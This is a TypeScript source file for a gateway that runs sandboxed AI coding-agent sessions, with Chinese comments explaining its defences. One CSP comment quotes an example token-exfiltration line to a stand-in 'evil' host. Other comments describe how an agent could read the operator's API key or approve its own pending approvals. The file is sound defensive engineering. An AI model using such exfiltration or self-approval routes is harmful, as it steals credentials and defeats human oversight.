import { randomUUID } from "node:crypto";
import { createReadStream, existsSync, mkdirSync } from "node:fs";
import { type IncomingMessage, type ServerResponse, createServer } from "node:http";
import { extname, join, normalize, resolve, sep } from "node:path";
import { type WebSocket, WebSocketServer } from "ws";
import { AuditLog } from "../audit/log.ts";
import type { ClientCommand, ClientEvent } from "../protocol/types.ts";
import type { ExecutionBackend } from "./execution-backend.ts";
import type { SandboxWiring } from "./sandbox-config.ts";
import { Session } from "./session.ts";

export interface GatewayConfig {
	port: number;
	host: string;
	/** 共享 token。Phase 1 用它把演示环境关起来；OIDC/SAML 是 Phase 2 的事 */
	token: string;
	policyFile: string;
	auditFile: string;
	workspaceRoot: string;
	webRoot: string;
	piBin?: string;
	piArgs?: string[];
	/**
	 * 传给 pi 子进程的环境变量。**刻意不默认继承 process.env** ——
	 * pi 会执行 agent 的 bash 工具，继承等于把网关的共享 token 与模型 key
	 * 一并交给 agent，一句 env 就拿到了。
	 */
	piEnv?: NodeJS.ProcessEnv;
	approvalTimeoutMs?: number;
	/** 会话空闲多久后回收（连同 pi 进程） */
	idleTimeoutMs?: number;
	/** 同时存活的会话上限，防止一条 token 把节点打满 */
	maxSessions?: number;
	/**
	 * 断线续接的事件缓冲条数。默认 2000。
	 * 缓冲满了最老的事件会被挤掉，续接时客户端会收到 session.gap ——
	 * 调小它等于让「断线久了会丢记录」更早发生。
	 */
	backlogSize?: number;
	/** 每个会话可用的 repo/team。策略作用域必须由服务端决定，不能让客户端自选 */
	resolveScope?: (actor: string) => { repo: string; team: string };
	/**
	 * 沙箱接线：模型网关与 git 代理的地址 + 代理 token。给了就为每个会话
	 * 生成隔离的 pi HOME，让 agent 只能经这两个代理出网。
	 * proxyToken 必须与本网关的 token 不同 —— 构造时断言，理由见 SandboxWiring。
	 */
	wiring?: SandboxWiring;
	/** 每个会话启动时 clone 的仓库（上游真实地址，经 insteadOf 重写到凭据代理） */
	repoUrl?: string;
	/** clone 超时。验收目标是「冷启动（含 clone）< 5s」，默认给 30s 留足余量 */
	cloneTimeoutMs?: number;
	/** pi 进程在哪儿跑。不给则直接在宿主机 spawn（无隔离） */
	backend?: ExecutionBackend;
}

const MIME: Record<string, string> = {
	".html": "text/html; charset=utf-8",
	".js": "text/javascript; charset=utf-8",
	".css": "text/css; charset=utf-8",
	".svg": "image/svg+xml",
};

/** sessionId 会直接参与工作区路径拼接，必须限死字符集 */
const SESSION_ID = /^[A-Za-z0-9_-]{1,64}$/;

interface Conn {
	ws: WebSocket;
	actor: string;
}

/**
 * 会话网关。浏览器经 WebSocket 连到这里，网关为每个会话拉起一个 pi 进程。
 *
 * 身份这块 Phase 1 只做到共享 token：它的作用是把演示环境关起来，
 * 不是企业级身份。OIDC/SAML + RBAC 在 Phase 2，不要拿现在这个去过安全评审。
 * 但即便身份只有共享 token，两件事也必须由服务端决定而不是客户端自选：
 * **会话归属**与**策略作用域（repo/team）**。后者尤其重要 —— 让客户端挑
 * 适用于自己的策略，等于给了一条一键降级的路。
 */
export class Gateway {
	#cfg: GatewayConfig;
	#audit: AuditLog;
	#http = createServer();
	#wss = new WebSocketServer({ noServer: true });
	#sessions = new Map<string, Session>();
	/** sessionId → 创建它的身份。别人拿到 id 也接不进来 */
	#owners = new Map<string, string>();
	#reaper: NodeJS.Timeout;
	#webRoot: string;

	constructor(cfg: GatewayConfig) {
		this.#cfg = cfg;
		this.#webRoot = resolve(cfg.webRoot);
		// 代理 token 会写进沙箱可读的 models.json。它若等于网关 token，
		// agent 就能连回网关、以任意 actor 接入会话并批准自己挂起的审批 ——
		// 等于把审批门的钥匙交给被审批的一方。这条必须在启动时炸掉。
		if (cfg.wiring && cfg.wiring.proxyToken === cfg.token) {
			throw new Error("wiring.proxyToken 不能等于网关 token：它会写进沙箱可读的配置，agent 读到就能连回网关批准自己的审批");
		}
		mkdirSync(cfg.workspaceRoot, { recursive: true });
		this.#audit = AuditLog.open(cfg.auditFile);

		this.#http.on("request", (req, res) => this.#serveStatic(req, res));
		this.#http.on("upgrade", (req, socket, head) => {
			if (!this.#authorized(req)) {
				socket.write("HTTP/1.1 401 Unauthorized\r\n\r\n");
				socket.destroy();
				return;
			}
			this.#wss.handleUpgrade(req, socket, head, (ws) => this.#onConnection(ws, req));
		});

		// 空闲回收：没有它，会话与 pi 进程只增不减
		this.#reaper = setInterval(() => this.#reap(), 30_000);
		this.#reaper.unref();
	}

	async listen(): Promise<number> {
		// 回收上次运行遗留的容器：网关被 SIGKILL 时来不及走 cleanup，
		// --rm 只保证容器退出后删记录、不保证容器退出。按 label 扫，
		// 只动本网关自己的（gatewayId 默认带 hostname+pid）。
		const reaped = await this.#cfg.backend?.reapOrphans?.();
		if (reaped?.length) {
			this.#audit.append({
				kind: "session.end",
				sessionId: "-",
				actor: "system",
				summary: `启动时回收了 ${reaped.length} 个遗留容器`,
			});
		}
		await new Promise<void>((r) => this.#http.listen(this.#cfg.port, this.#cfg.host, r));
		const addr = this.#http.address();
		return typeof addr === "object" && addr ? addr.port : this.#cfg.port;
	}

	async close(): Promise<void> {
		clearInterval(this.#reaper);
		for (const s of this.#sessions.values()) await s.stop();
		this.#sessions.clear();
		this.#owners.clear();
		// 必须先断开在途连接：http.close() 要等所有连接关闭才回调，
		// 而 WebSocket 是长连接，不主动断开就会一直等下去。
		for (const client of this.#wss.clients) client.terminate();
		this.#wss.close();
		this.#http.closeAllConnections();
		await new Promise<void>((r) => this.#http.close(() => r()));
		this.#audit.close();
	}

	get sessionCount(): number {
		return this.#sessions.size;
	}

	/** 回收空闲会话与已死会话，连同它们的 pi 进程 */
	#reap(): void {
		const idleLimit = this.#cfg.idleTimeoutMs ?? 30 * 60_000;
		for (const [id, session] of this.#sessions) {
			if (!session.alive || session.idleMs > idleLimit) {
				this.#sessions.delete(id);
				this.#owners.delete(id);
				void session.stop();
			}
		}
	}

	#authorized(req: IncomingMessage): boolean {
		const url = new URL(req.url ?? "/", "http://localhost");
		// 浏览器的 WebSocket 构造函数不能自定义 header，因此也接受查询参数。
		// 查询串会进代理与服务器日志 —— 上生产前必须换成 OIDC。
		const token = url.searchParams.get("token") ?? bearer(req.headers.authorization);
		return !!token && token === this.#cfg.token;
	}

	#onConnection(ws: WebSocket, req: IncomingMessage): void {
		const url = new URL(req.url ?? "/", "http://localhost");
		const actor = url.searchParams.get("actor") ?? "demo@local";
		const requested = url.searchParams.get("session");

		if (requested && !SESSION_ID.test(requested)) {
			// sessionId 参与工作区路径拼接：`../../..` 能把 agent 的 cwd
			// 指到网关主机上任意目录，顺带让所有按仓库相对路径写的策略脱靶
			closeWith(ws, "非法的 session id");
			return;
		}

		const existing = requested ? this.#sessions.get(requested) : undefined;
		if (existing) {
			if (this.#owners.get(requested!) !== actor) {
				// 会话 id 会出现在 URL、日志与审计里；仅凭知道 id 就能接管
				// 别人的会话（发 prompt、批准别人挂起的审批）是越权
				closeWith(ws, "无权接入该会话");
				return;
			}
			attach(ws, existing, actor);
			return;
		}

		if (this.#sessions.size >= (this.#cfg.maxSessions ?? 50)) {
			closeWith(ws, "会话数已达上限");
			return;
		}

		const sessionId = requested ?? randomUUID();
		// 策略作用域由服务端决定：客户端自选 repo/team 等于自选适用规则
		const scope = this.#cfg.resolveScope?.(actor) ?? { repo: "default", team: "default" };
		const session = new Session({
			sessionId,
			actor,
			repo: scope.repo,
			team: scope.team,
			workspace: join(this.#cfg.workspaceRoot, sessionId),
			policyFile: this.#cfg.policyFile,
			audit: this.#audit,
			piBin: this.#cfg.piBin,
			piArgs: this.#cfg.piArgs,
			piEnv: this.#cfg.piEnv,
			approvalTimeoutMs: this.#cfg.approvalTimeoutMs,
			backlogSize: this.#cfg.backlogSize,
			wiring: this.#cfg.wiring,
			// HOME 放在 workspace 之外：放在里面的话，agent 一句
			// git add -A && git commit 就把含 token 的 .gitconfig 提交进仓库
			sandboxHome: join(this.#cfg.workspaceRoot, ".homes", sessionId),
			repoUrl: this.#cfg.repoUrl,
			cloneTimeoutMs: this.#cfg.cloneTimeoutMs,
			backend: this.#cfg.backend,
			// 提交身份带上会话发起人，上游提交可归属到具体的人
			...(this.#cfg.wiring ? { wiring: { ...this.#cfg.wiring, authorEmail: actor } } : {}),
			send: (ev, seq, target) => broadcast(session, ev, seq, target),
		});
		this.#sessions.set(sessionId, session);
		this.#owners.set(sessionId, actor);
		attach(ws, session, actor);
		void session.start();
	}

	#serveStatic(req: IncomingMessage, res: ServerResponse): void {
		const url = new URL(req.url ?? "/", "http://localhost");
		const rel = url.pathname === "/" ? "/index.html" : decodeURIComponent(url.pathname);
		const file = resolve(join(this.#webRoot, normalize(rel)));
		// 带分隔符比较：裸 startsWith 会让 /srv/web 放行 /srv/website/...
		if (!(file === this.#webRoot || file.startsWith(this.#webRoot + sep)) || !existsSync(file)) {
			res.writeHead(404).end("not found");
			return;
		}
		res.writeHead(200, {
			"content-type": MIME[extname(file)] ?? "application/octet-stream",
			// token 在 URL 里是 Phase 1 的已声明取舍，正因如此更需要 CSP 兜住 XSS。
			// connect-src **不能**写 `ws: wss:` —— 那是 scheme-source，匹配任意主机，
			// 注入的脚本一句 new WebSocket("wss://evil/?t="+location.search) 就把
			// token 送走了。CSP3 规定 'self' 匹配同源的 ws/wss，够用。
			// form-action 是 connect-src 之外的第二条外传路径，且不回落到 default-src。
			"content-security-policy":
				"default-src 'self'; connect-src 'self'; img-src 'self' data:; " +
				"form-action 'none'; base-uri 'none'; frame-ancestors 'none'",
			"x-frame-options": "DENY",
			"referrer-policy": "no-referrer",
		});
		createReadStream(file).pipe(res);
	}
}

/** 一个会话可以同时连着多个传输（刷新页面、多标签），事件广播给全部 */
const transports = new WeakMap<Session, Set<Conn>>();

function attach(ws: WebSocket, session: Session, actor: string): void {
	const set = transports.get(session) ?? new Set<Conn>();
	const conn: Conn = { ws, actor };
	set.add(conn);
	transports.set(session, set);

	ws.on("message", (raw) => {
		let cmd: ClientCommand;
		try {
			cmd = JSON.parse(String(raw)) as ClientCommand;
		} catch {
			ws.send(JSON.stringify({ type: "control", control: "error", message: "非法的命令 JSON" }));
			return;
		}
		// 审批人是实际点下按钮的那条连接，不是会话创建者
		session.handle(cmd, actor, conn);
	});
	ws.on("close", () => set.delete(conn));
	// 传输层错误不应连带打死会话：任务在服务端继续跑，用户重连即可续上
	ws.on("error", () => set.delete(conn));

	// 控制帧不参与 seq 序列。之前这里发的是一条 seq=lastSeq 的伪 session.state，
	// 它会把前端的 state.seq 直接顶到最新，导致随后 resume 补发的事件
	// 全部被「seq <= state.seq」的去重逻辑丢掉 —— 断线期间的事件实际补不回来。
	ws.send(JSON.stringify({ type: "control", control: "attached", lastSeq: session.lastSeq }));
}

function broadcast(session: Session, event: ClientEvent, seq: number, target?: unknown): void {
	const payload = JSON.stringify({ seq, event });
	for (const conn of transports.get(session) ?? []) {
		if (target && conn !== target) continue;
		if (conn.ws.readyState === conn.ws.OPEN) conn.ws.send(payload);
	}
}

function closeWith(ws: WebSocket, message: string): void {
	ws.send(JSON.stringify({ type: "control", control: "error", message }));
	ws.close(4003, message);
}

function bearer(header: string | undefined): string | null {
	return header?.startsWith("Bearer ") ? header.slice(7) : null;
}

// 直接运行时按环境变量启动
if (process.argv[1] && import.meta.filename === process.argv[1]) {
	const root = join(import.meta.dirname, "..", "..");
	const token = process.env.PERIMETER_TOKEN ?? "dev-token";
	mkdirSync(join(root, "audit-data"), { recursive: true });
	const gw = new Gateway({
		port: Number(process.env.PORT ?? 8787),
		host: process.env.HOST ?? "127.0.0.1",
		token,
		policyFile: process.env.PERIMETER_POLICY_FILE ?? join(root, "config/policy.yaml"),
		auditFile: process.env.PERIMETER_AUDIT_FILE ?? join(root, "audit-data/audit.jsonl"),
		workspaceRoot: process.env.PERIMETER_WORKSPACES ?? join(root, "workspaces"),
		webRoot: join(root, "web"),
		piArgs: process.env.PERIMETER_PI_ARGS?.split(" ").filter(Boolean),
		// 显式白名单：pi 只拿到跑起来必需的变量，网关的 token 不在其中
		// 刻意不传 HOME：这个入口没配 wiring，传了的话 agent 一句
		// cat ~/.pi/agent/models.json 就拿到操作员真实的 provider API key
		piEnv: { PATH: process.env.PATH, LANG: process.env.LANG },
	});
	const port = await gw.listen();
	console.log(`网关已启动 http://127.0.0.1:${port}/?token=${token}`);
}
